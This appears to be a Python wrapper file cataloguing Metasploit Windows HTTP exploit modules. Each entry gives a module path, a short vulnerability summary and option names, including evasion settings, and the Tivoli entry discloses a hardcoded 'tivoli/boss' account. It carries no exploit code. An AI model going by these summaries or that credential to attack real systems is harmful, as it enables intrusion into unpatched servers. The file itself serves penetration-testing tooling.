			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'

	class windows_http_cogent_datahub_command(object):
		"""
		
        This module exploits an injection vulnerability in Cogent DataHub prior
        to 7.3.5. The vulnerability exists in the GetPermissions.asp page, which
        makes insecure use of the datahub_command function with user controlled
        data, allowing execution of arbitrary datahub commands and scripts. This
        module has been tested successfully with Cogent DataHub 7.3.4 on
        Windows 7 SP1. Please also note that after exploitation, the remote service
        will most likely hang and restart manually.
      
		"""

		path = 'windows/http/cogent_datahub_command'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			required_URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_WEBDAV_DELAY = 'WEBDAV_DELAY'
			UNCPATH = 'UNCPATH'

	class windows_http_adobe_robohelper_authbypass(object):
		"""
		
          This module exploits an authentication bypass vulnerability which
        allows remote attackers to upload and execute arbitrary code.
      
		"""

		path = 'windows/http/adobe_robohelper_authbypass'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'

	class windows_http_hp_nnm_webappmon_execvp(object):
		"""
		
          This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.53
        prior to NNM_01207 or NNM_01206 without the SSRT100025 hotfix. By specifying a long 'sel'
        parameter when calling methods within the 'webappmon.exe' CGI program, an attacker can
        cause a stack-based buffer overflow and execute arbitrary code.

        This vulnerability is not triggerable via a GET request due to limitations on the
        request size. The buffer being targetted is 16384 bytes in size. There are actually two
        adjacent buffers that both get overflowed (one into the other), and strcat is used.

        The vulnerable code is within the "execvp_nc" function within "ov.dll" prior to
        v 1.30.12.69. There are no stack cookies, so exploitation is easily achieved by
        overwriting the saved return address or SEH frame.

        This vulnerability might also be triggerable via other CGI programs, however this was
        not fully investigated.
      
		"""

		path = 'windows/http/hp_nnm_webappmon_execvp'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'

	class windows_http_bea_weblogic_jsessionid(object):
		"""
		
          This module exploits a buffer overflow in BEA's WebLogic plugin. The vulnerable
        code is only accessible when clustering is configured. A request containing a
        long JSESSION cookie value can lead to arbirtary code execution.
      
		"""

		path = 'windows/http/bea_weblogic_jsessionid'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_http_edirectory_imonitor(object):
		"""
		
          This module exploits a stack buffer overflow in eDirectory 8.7.3
        iMonitor service. This vulnerability was discovered by Peter
        Winter-Smith of NGSSoftware.

        NOTE: repeated exploitation attempts may cause eDirectory to crash. It does
        not restart automatically in a default installation.
      
		"""

		path = 'windows/http/edirectory_imonitor'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'

	class windows_http_desktopcentral_file_upload(object):
		"""
		
        This module exploits an arbitrary file upload vulnerability in Desktop Central v7 to
        v8 build 80293. A malicious user can upload a JSP file into the web root without
        authentication, leading to arbitrary code execution as SYSTEM.
      
		"""

		path = 'windows/http/desktopcentral_file_upload'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			FileDropperDelay = 'FileDropperDelay'

	class windows_http_hp_nnm_nnmrptconfig_schdparams(object):
		"""
		
        This module exploits NNM's nnmRptConfig.exe. Similar to other NNM CGI bugs,
        the overflow occurs during a ov.sprintf_new() call, which allows an attacker to
        overwrite data on the stack, and gain arbitrary code execution.
      
		"""

		path = 'windows/http/hp_nnm_nnmrptconfig_schdparams'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_http_belkin_bulldog(object):
		"""
		
          This module exploits a stack buffer overflow in Belkin Bulldog Plus
        4.0.2 build 1219. When sending a specially crafted http request,
        an attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/http/belkin_bulldog'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'

	class windows_http_xampp_webdav_upload_php(object):
		"""
		
          This module exploits weak WebDAV passwords on XAMPP servers.
          It uses supplied credentials to upload a PHP payload and
          execute it.
      
		"""

		path = 'windows/http/xampp_webdav_upload_php'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_PATH = 'PATH'
			FILENAME = 'FILENAME'
			USERNAME = 'USERNAME'
			PASSWORD = 'PASSWORD'

	class windows_http_ibm_tsm_cad_header(object):
		"""
		
          This module exploits a stack buffer overflow in the IBM Tivoli Storage Manager Express CAD Service (5.3.3).
        By sending an overly long GET request, it may be possible for an attacker to execute arbitrary code.
      
		"""

		path = 'windows/http/ibm_tsm_cad_header'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_http_hp_imc_mibfileupload(object):
		"""
		
          This module exploits a code execution flaw in HP Intelligent Management Center.
        The vulnerability exists in the mibFileUpload which is accepting unauthenticated
        file uploads and handling zip contents in a insecure way. Combining both weaknesses
        a remote attacker can accomplish arbitrary file upload. This module has been tested
        successfully on HP Intelligent Management Center 5.1 E0202 over Windows 2003 SP2.
      
		"""

		path = 'windows/http/hp_imc_mibfileupload'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			FileDropperDelay = 'FileDropperDelay'
			required_TARGETURI = 'TARGETURI'

	class windows_http_ibm_tivoli_endpoint_bof(object):
		"""
		
          This module exploits a stack based buffer overflow in the way IBM Tivoli
        Endpoint Manager versions 3.7.1, 4.1, 4.1.1, 4.3.1 handles long POST query
        arguments.

        This issue can be triggered by sending a specially crafted HTTP POST request to
      the service (lcfd.exe) listening on TCP port 9495. To trigger this issue authorization
      is required. This exploit makes use of a second vulnerability, a hardcoded account
      (tivoli/boss) is used to bypass the authorization restriction.
      
		"""

		path = 'windows/http/ibm_tivoli_endpoint_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
